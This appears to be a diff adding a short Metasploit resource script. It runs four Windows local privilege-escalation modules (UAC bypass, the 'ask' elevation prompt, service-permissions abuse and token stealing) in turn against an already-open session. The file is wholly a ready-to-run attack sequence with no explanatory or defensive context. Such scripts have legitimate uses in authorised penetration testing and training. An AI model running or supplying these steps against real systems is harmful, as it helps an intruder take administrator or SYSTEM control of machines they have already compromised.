@@ -1,0 +1,13 @@
+sessions -i SESSION
+use exploit/windows/local/bypassuac
+set SESSION SESSION
+exploit
+use exploit/windows/local/ask
+set SESSION SESSION
+exploit
+use exploit/windows/local/service_permissions
+set SESSION SESSION
+exploit
+use exploit/windows/local/token_stealing
+set SESSION SESSION
+exploit
